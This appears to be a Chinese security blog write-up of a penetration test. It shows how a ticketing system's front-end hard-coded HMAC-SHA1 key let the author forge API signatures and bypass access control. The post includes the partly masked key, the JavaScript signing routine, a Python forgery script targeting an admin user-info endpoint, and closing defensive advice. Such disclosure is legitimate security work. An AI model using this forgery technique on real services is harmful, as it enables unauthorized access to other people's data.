#  API签名机制逆向破解实战：从代码审计到全局越权  
原创 tangkaixing  开心网安   2025-07-18 14:58  
  
**免责声明**  
  
由于传播、利用本公众号开心网安所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号开心网安  
及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！  
####   
#### 一、漏洞概述  
  
在渗透某企业工单处理系统时，发现其核心API鉴权机制存在严重设计缺陷。发现通过逆向JS签名算法，可完全伪造合法请求签名，  
**绕过全部接口权限验证**  
，直接操作后台敏感数据（如工单、用户接口等）。以下是完整破解技术路径演示👇  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uLpuFLYKHdXvr9gG20jH8kRYRTQG4w9HJ62Bo1cpKiaY1LRKS8PaHO8w4o9NJwRaCgjp7ZHg8ZGUIwaicAticLibSA/640?wx_fmt=png&from=appmsg "")  
#### 二、签名机制深度解析（三步定位致命漏洞）  
  
**1. 关键参数暴露（前端硬编码也是该漏洞成功主要原因）**  
```
// 前端明文存储核心密钥
APP_SIG: "WE$&****#!V",  // 全局固定签名密钥
pwd_salt: "O7Sw0k****#Gc.UjfT8"// 密码盐值暴露
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uLpuFLYKHdXvr9gG20jH8kRYRTQG4w9HL0q6DU1dianFo1xcPtHR9TmclwPBtVnRRcehQQpCTUZRkwFSj5btgibw/640?wx_fmt=png&from=appmsg "")  
  
**2. 签名生成流程（风险设计链）**  
```
function c(t, e, n) {
  e.appcode = "web"; 
  e.rnd = 99999998 * Math.random() + 1; // 伪随机数风险
  e.ts = Date.now(); 
  e.sig = HmacSHA1(  // 致命点：HMAC-SHA1密钥固定
    url + "?" + sortParams(e), // 参数按字母排序拼接
    APP_SIG // 硬编码密钥
  ) 
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uLpuFLYKHdXvr9gG20jH8kRYRTQG4w9HuNcYicucHzYxY69YkEXlvM1329s3REgRkfwZWAAV9z6sNokGUq4QV1A/640?wx_fmt=png&from=appmsg "")  
  
**3. 存在致命五重安全缺陷：**  
1. **密钥固化**  
：  
APP_SIG  
前端硬编码无动态更新  
  
1. **弱随机源**  
：  
Math.random()  
可预测（CVE-2017-16005类漏洞）  
  
1. **算法透明**  
：签名全流程前端可见  
  
1. **参数未校验**  
：未验证时间戳有效性  
  
1. **盐值泄漏**  
：  
pwd_salt  
暴露导致密码加密可逆  
  
#### 三、伪造攻击脚本（Python实现）  
```
import json
import random
import time
import hmac
import hashlib
from urllib.parse import urlencode
def generate_sig(url, params, app_sig):
    # 处理 URL
    if url.startswith('https://') or url.startswith('http://'):
        url = url.split('/', 3)[-1]
    
    # 添加固定参数
    params['appcode'] = 'web'
    params['rnd'] = int(99999998 * random.random()) + 1
    params['ts'] = int(time.time() * 1000)
    
    # 排序参数并拼接
    sorted_params = sorted(params.items())
    query_string = urlencode(sorted_params)
    
    # 生成签名
    sig_str = url + '?' + query_string
    sig = hmac.new(app_sig.encode(), sig_str.encode(), hashlib.sha1).hexdigest()
    
    # 构造最终的 URL
    final_url = f"/xxx-xxx-xxx{url}?{query_string}&sig={sig}"
    return final_url
# 示例用法
url = '/getUserInfo'
params = {
    'ageNum': 1,
    'pageSize': 4,
    'loginName': 'admin',
    'uat': 'e9a2680769af42cb89bc033ba40946f4' 
}
app_sig = 'WE$&******#!V'  # 从提供的 JavaScript 代码中获取
final_url = generate_sig(url, params, app_sig)
print(final_url)
```  
  
验证展示  
getUserInfo接口，其余接口就不展示涉及敏感数据太多，该漏洞已修复。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uLpuFLYKHdXvr9gG20jH8kRYRTQG4w9H7Y6ibxCdI7z5HnSLsJbuVleicceFAt6rz9STzaQqfntFVAibDpibAozbKw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uLpuFLYKHdXvr9gG20jH8kRYRTQG4w9HamrTzaZjOtvfNqBwRDWeiajxoa0icJbBbvC1kZ4qzMQERTygS9LME0kA/640?wx_fmt=png&from=appmsg "")  
#### 四、总结  
  
该漏洞案例暴露了API签名中典型的「前端信任」误区：  
- 🔓 固定密钥 + 透明算法 = 攻击者的万能钥匙  
  
- ⏱️ 时间戳不校验使重放攻击长期有效  
  
- ⚠️ 前端安全绝不能依赖代码混淆  
  
> **防御核心**  
：签名密钥必须存于安全环境（HSM/可信服务端），遵循  
**零信任原则**  
才是保障API安全的根本路径。  
  
#### ps：因为现在在HW，更新比较慢等结束后，尽量做到一周一更，感谢各位看官！！！  
  
  
  
